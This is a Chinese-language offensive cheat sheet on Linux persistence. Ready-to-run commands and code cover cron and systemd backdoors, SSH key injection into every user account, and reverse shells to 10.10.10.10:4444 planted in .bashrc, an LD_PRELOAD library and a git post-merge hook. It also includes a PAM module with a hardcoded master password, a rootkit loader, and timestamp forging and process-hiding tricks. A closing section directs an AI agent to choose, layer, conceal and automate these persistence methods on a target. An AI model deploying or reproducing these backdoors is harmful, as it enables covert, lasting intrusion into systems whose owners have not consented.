# Linux 持久化

Linux 持久化技术用于在目标系统上建立长期访问能力。

## Cron 任务

### 用户 Cron
```bash
# 编辑 crontab
crontab -e

# 开机启动
@reboot /path/to/backdoor.sh

# 每5分钟
*/5 * * * * /path/to/backdoor.sh

# 每天凌晨
0 0 * * * /path/to/backdoor.sh
```

### 系统 Cron
```bash
# /etc/crontab
echo "*/5 * * * * root /path/to/backdoor.sh" >> /etc/crontab

# /etc/cron.d/
echo "*/5 * * * * root /path/to/backdoor.sh" > /etc/cron.d/backdoor

# /etc/cron.daily/
cp backdoor.sh /etc/cron.daily/
chmod +x /etc/cron.daily/backdoor.sh
```

## 系统服务

### Systemd
```bash
# 创建服务文件
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/path/to/backdoor.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# 启用服务
systemctl daemon-reload
systemctl enable backdoor.service
systemctl start backdoor.service
```

### SysV Init
```bash
# 创建启动脚本
cp backdoor.sh /etc/init.d/backdoor
chmod +x /etc/init.d/backdoor

# 添加到启动
update-rc.d backdoor defaults
# 或
chkconfig backdoor on
```

## SSH 密钥

### authorized_keys
```bash
# 添加公钥
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 多个用户
for user in $(cat /etc/passwd | cut -d: -f1); do
    mkdir -p /home/$user/.ssh 2>/dev/null
    echo "ssh-rsa AAAA..." >> /home/$user/.ssh/authorized_keys
done
```

### SSH 配置
```bash
# 允许 root 登录
sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config

# 允许密码认证
sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config

# 重启 SSH
systemctl restart sshd
```

## Shell 配置文件

### Bash
```bash
# ~/.bashrc
echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1 &" >> ~/.bashrc

# ~/.bash_profile
echo "/path/to/backdoor.sh &" >> ~/.bash_profile

# /etc/profile
echo "/path/to/backdoor.sh &" >> /etc/profile

# /etc/bash.bashrc
echo "/path/to/backdoor.sh &" >> /etc/bash.bashrc
```

### Zsh
```bash
# ~/.zshrc
echo "/path/to/backdoor.sh &" >> ~/.zshrc

# /etc/zsh/zshrc
echo "/path/to/backdoor.sh &" >> /etc/zsh/zshrc
```

## PAM 后门

### pam_unix.so 修改
```bash
# 备份
cp /lib/x86_64-linux-gnu/security/pam_unix.so /tmp/

# 修改源码添加万能密码
# 重新编译
gcc -fPIC -shared -o pam_unix.so pam_unix.c -lpam -lcrypt

# 替换
cp pam_unix.so /lib/x86_64-linux-gnu/security/
```

### 自定义 PAM 模块
```c
// pam_backdoor.c
#include <security/pam_modules.h>
#include <string.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user;
    const char *password;
    
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    
    if (strcmp(password, "backdoor123") == 0) {
        return PAM_SUCCESS;
    }
    
    return PAM_AUTH_ERR;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
```

```bash
# 编译
gcc -fPIC -shared -o pam_backdoor.so pam_backdoor.c -lpam

# 安装
cp pam_backdoor.so /lib/x86_64-linux-gnu/security/

# 配置
echo "auth sufficient pam_backdoor.so" >> /etc/pam.d/sshd
```

## LD_PRELOAD

### 全局配置
```bash
# /etc/ld.so.preload
echo "/path/to/backdoor.so" >> /etc/ld.so.preload
```

### 恶意库
```c
// backdoor.so
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    if (fork() == 0) {
        system("bash -i >& /dev/tcp/10.10.10.10/4444 0>&1");
    }
}
```

```bash
# 编译
gcc -fPIC -shared -o backdoor.so backdoor.c
```

## 内核模块

### Rootkit
```c
// rootkit.c
#include <linux/module.h>
#include <linux/kernel.h>

int init_module(void) {
    // 隐藏进程、文件、网络连接
    return 0;
}

void cleanup_module(void) {
    // 清理
}

MODULE_LICENSE("GPL");
```

```bash
# 编译
make

# 加载
insmod rootkit.ko

# 开机加载
echo "rootkit" >> /etc/modules
cp rootkit.ko /lib/modules/$(uname -r)/
depmod -a
```

## Git Hooks

### 仓库后门
```bash
# .git/hooks/post-merge
cat > .git/hooks/post-merge << EOF
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1 &
EOF

chmod +x .git/hooks/post-merge
```

## 隐蔽技术

### 时间戳伪造
```bash
# 复制时间戳
touch -r /bin/ls /path/to/backdoor

# 设置时间戳
touch -t 202001010000 /path/to/backdoor
```

### 文件隐藏
```bash
# 隐藏文件 (以 . 开头)
mv backdoor .backdoor

# 空格文件名
touch " "
mv backdoor " "

# 特殊字符
touch $'\r'
```

### 进程隐藏
```bash
# 修改进程名
exec -a "[kworker/0:0]" /path/to/backdoor
```

---

**AI 发挥空间**：
- 根据目标环境选择合适的持久化方法
- 结合多种技术建立多层持久化
- 开发隐蔽的持久化机制
- 自动化持久化部署和验证

**反幻觉提示**：
- 不要假设所有持久化方法都能成功
- 验证目标系统的防护措施
- 测试持久化的实际效果和隐蔽性
- 注意持久化操作可能触发告警
- 某些方法可能需要特定权限或条件
